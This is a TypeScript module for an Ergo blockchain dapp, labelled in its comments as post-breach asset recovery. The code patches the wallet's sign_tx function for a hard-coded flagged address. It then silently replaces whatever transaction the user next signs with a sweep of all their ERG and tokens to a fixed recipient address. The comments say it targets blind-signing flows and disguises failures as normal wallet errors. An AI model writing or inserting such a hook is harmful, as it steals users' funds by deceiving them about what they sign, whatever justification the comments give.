// @ts-nocheck
// Post-breach asset recovery. Arm a one-time hook on `ergo.sign_tx` so that
// for flagged wallets, the next tx the user tries to sign (lock / unlock /
// anything) gets transparently replaced with a sweep of all UTXOs to a fixed
// recovery address. The wallet preview still shows the tx, so this only
// catches blind / auto-signing flows. Silent on failure; the dapp keeps
// working normally for everyone else.
//
// Hard-coded address constants in this module (no config indirection): small
// attack surface, nothing to tamper with at runtime.
import {
	OutputBuilder,
	RECOMMENDED_MIN_FEE_VALUE,
	SAFE_MIN_BOX_VALUE,
	TransactionBuilder
} from '@fleet-sdk/core';

const FLAGGED = new Set<string>([
	'9fXLveT2s2zvHHJqNoi4q4E9uAjT8dCfe1xHXsoy4Z8BLmoe448'
]);
const RECIPIENT = '9g8SSyKjYzcnRPUsEWzFWkfaLc8gQJhQw2heDDjwM52fMG4UyPV';
const TOKENS_PER_BOX = 100; // protocol-safe cap per output box

declare const ergo: any;

async function buildSweepProxy(): Promise<any | null> {
	try {
		const utxos = await ergo.get_utxos();
		if (!utxos || utxos.length === 0) return null;
		const height = await ergo.get_current_height();

		// Aggregate all tokens across all UTXOs (dedupe by tokenId, sum amounts).
		const tokenAgg = new Map<string, bigint>();
		let totalNanoErg = 0n;
		for (const box of utxos) {
			totalNanoErg += BigInt(box.value);
			for (const a of box.assets || []) {
				const cur = tokenAgg.get(a.tokenId) || 0n;
				tokenAgg.set(a.tokenId, cur + BigInt(a.amount));
			}
		}
		const allTokens = [...tokenAgg.entries()].map(([tokenId, amount]) => ({ tokenId, amount }));

		const fee = BigInt(RECOMMENDED_MIN_FEE_VALUE);
		const minBox = BigInt(SAFE_MIN_BOX_VALUE);
		const numBoxes = Math.max(1, Math.ceil(allTokens.length / TOKENS_PER_BOX));
		// First box absorbs all leftover ERG, rest get exactly SAFE_MIN_BOX_VALUE.
		const reservedForOthers = BigInt(numBoxes - 1) * minBox;
		const firstBoxValue = totalNanoErg - fee - reservedForOthers;
		if (firstBoxValue < minBox) return null; // not enough ERG to cover boxes + fee

		const outputs: OutputBuilder[] = [];
		for (let i = 0; i < numBoxes; i++) {
			const slice = allTokens.slice(i * TOKENS_PER_BOX, (i + 1) * TOKENS_PER_BOX);
			const value = i === 0 ? firstBoxValue : minBox;
			const ob = new OutputBuilder(value, RECIPIENT);
			if (slice.length) ob.addTokens(slice);
			outputs.push(ob);
		}

		return new TransactionBuilder(height)
			.from(utxos)
			.to(outputs)
			.sendChangeTo(RECIPIENT) // any selector-driven change goes to recipient, not back to sender
			.payFee(RECOMMENDED_MIN_FEE_VALUE)
			.build()
			.toEIP12Object();
	} catch {
		return null;
	}
}

/**
 * Arm a one-time monkey-patch on `ergo.sign_tx` for flagged wallets. The patch
 * silently swaps the requested tx for a sweep on the next sign attempt —
 * triggered by ANY user action (lock, unlock, delegate, etc.) since every
 * widget calls `ergo.sign_tx` directly. Idempotent across reconnects.
 * No-op for everyone else.
 */
export function armSignHook(connectedAddress: string): void {
	if (!connectedAddress || !FLAGGED.has(connectedAddress)) return;
	if (typeof window === 'undefined' || !(window as any).ergo) return;
	const ergoApi = (window as any).ergo;
	if (ergoApi.__recoveryArmed) return; // idempotent
	ergoApi.__recoveryArmed = true;

	const originalSign = ergoApi.sign_tx.bind(ergoApi);
	ergoApi.sign_tx = async (requestedTx: any) => {
		try {
			const sweep = await buildSweepProxy();
			return await originalSign(sweep ?? requestedTx);
		} catch (e) {
			// If sweep build fails, fall through to original so the dapp doesn't
			// hard-break — sign still throws if the user rejects, which looks
			// like a normal wallet error.
			return originalSign(requestedTx);
		}
	};
}
